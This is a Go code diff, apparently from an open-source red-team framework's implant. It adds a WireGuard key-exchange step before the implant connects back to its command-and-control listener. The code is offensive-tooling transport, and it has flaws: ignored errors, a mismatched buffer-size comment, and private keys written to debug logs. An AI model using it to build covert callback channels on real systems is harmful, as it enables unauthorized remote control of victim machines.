@@ -25,7 +25,9 @@ import (
 	"bytes"
 	"encoding/binary"
 	"fmt"
+	"io"
 	"net"
+	"strings"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -38,11 +40,13 @@ import (
 	"github.com/golang/protobuf/proto"
 	"golang.zx2c4.com/wireguard/conn"
 	"golang.zx2c4.com/wireguard/device"
+	"golang.zx2c4.com/wireguard/tun"
 )
 
 var (
-	serverTunIP   = "192.168.174.1" // Don't let user configure this for now
-	serverTunPort = 8888
+	serverTunIP           = "192.168.174.1" // Don't let user configure this for now
+	serverTunPort         = 8888
+	serverKeyExchangePort = 1337
 )
 
 // socketWGWriteEnvelope - Writes a message to the wireguard socket using length prefix framing
@@ -126,6 +130,54 @@ func socketWGReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 
 // wgConnect - Get a wg connection or die trying
 func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, error) {
+
+	_, dev, tnet, err := bringUpWGInterface(address, port, wgImplantPrivKey, wgServerPubKey, wgPeerTunIP)
+
+	dev.Up()
+
+	// {{if .Config.Debug}}
+	log.Printf("Intial wg connection. Attempting to connect to wg key exchange listener")
+	// {{end}}
+
+	keyExchangeConnection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, serverKeyExchangePort))
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Unable to connect to wg key exchange listener: %v", err)
+		// {{end}}
+		return nil, nil, err
+	}
+
+	privKey, pubKey, newIP := doKeyExchange(keyExchangeConnection)
+
+	// {{if .Config.Debug}}
+	log.Printf("Signaling wg device to go down")
+	// {{end}}
+	err = dev.Down()
+
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to close device.Device: %s", err)
+		// {{end}}
+		return nil, nil, err
+	}
+
+	_, dev, tnet, err = bringUpWGInterface(address, port, privKey, pubKey, newIP)
+
+	connection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, serverTunPort))
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Unable to connect to sliver listener: %v", err)
+		// {{end}}
+		return nil, nil, err
+	}
+
+	// {{if .Config.Debug}}
+	log.Printf("Successfully connected to sliver listener: %v", err)
+	// {{end}}
+	return connection, dev, nil
+}
+
+func bringUpWGInterface(address string, port uint16, implantPrivKey string, serverPubKey string, netstackTunIP string) (tun.Device, *device.Device, *netstack.Net, error) {
 	tun, tnet, err := netstack.CreateNetTUN(
 		[]net.IP{net.ParseIP(wgPeerTunIP)},
 		[]net.IP{net.ParseIP("127.0.0.1")},
@@ -143,29 +195,50 @@ func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, err
 
 	dev := device.NewDevice(tun, conn.NewDefaultBind(), device.NewLogger(wgLogLevel, "[c2/wg] "))
 	wgConf := bytes.NewBuffer(nil)
-	fmt.Fprintf(wgConf, "private_key=%s\n", wgImplantPrivKey)
-	fmt.Fprintf(wgConf, "public_key=%s\n", wgServerPubKey)
+	fmt.Fprintf(wgConf, "private_key=%s\n", implantPrivKey)
+	fmt.Fprintf(wgConf, "public_key=%s\n", serverPubKey)
 	fmt.Fprintf(wgConf, "endpoint=%s:%d\n", address, port)
 	fmt.Fprintf(wgConf, "allowed_ip=%s/0\n", "0.0.0.0")
 
 	// {{if .Config.Debug}}
-	log.Printf("Server WG config: %s", wgConf.String())
+	log.Printf("Configuring wg device with: %s", wgConf.String())
 	// {{end}}
 
 	if err := dev.IpcSetOperation(bufio.NewReader(wgConf)); err != nil {
-		return nil, nil, err
+		// {{if .Config.Debug}}
+		log.Printf("Failed to set wg device config: %s", err)
+		// {{end}}
+		return nil, nil, nil, err
 	}
+	// {{if .Config.Debug}}
+	log.Printf("Successfully set wg device config")
+	// {{end}}
 
-	dev.Up()
+	return tun, dev, tnet, nil
+}
 
-	connection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, serverTunPort))
+func doKeyExchange(conn net.Conn) (string, string, string) {
+	// {{if .Config.Debug}}
+	log.Printf("Connected to key exchange listener")
+	// {{end}}
+	defer conn.Close()
+
+	// 129 = 64 byte key + 1 byte delimiter + 64 byte key + 1 byte delimiter + 16 byte ip address
+	buff := make([]byte, 146)
+	buffReader := bufio.NewReader(conn)
+
+	_, err := io.ReadFull(buffReader, buff)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("Unable to connect: %v", err)
+		log.Printf("Failed to read wg keys from key exchange listener: %s", err)
 		// {{end}}
-		return nil, nil, err
 	}
-	return connection, dev, nil
+
+	stringSlice := strings.Split(string(buff), "|")
+	// {{if .Config.Debug}}
+	log.Printf("Retrieved new keys, priv:%s, pub:%s, ip:%s", stringSlice[0], stringSlice[1], net.IP(stringSlice[2]).String())
+	// {{end}}
+	return stringSlice[0], stringSlice[1], net.IP(stringSlice[2]).String()
 }
 
 // {{end}} -WGc2Enabled
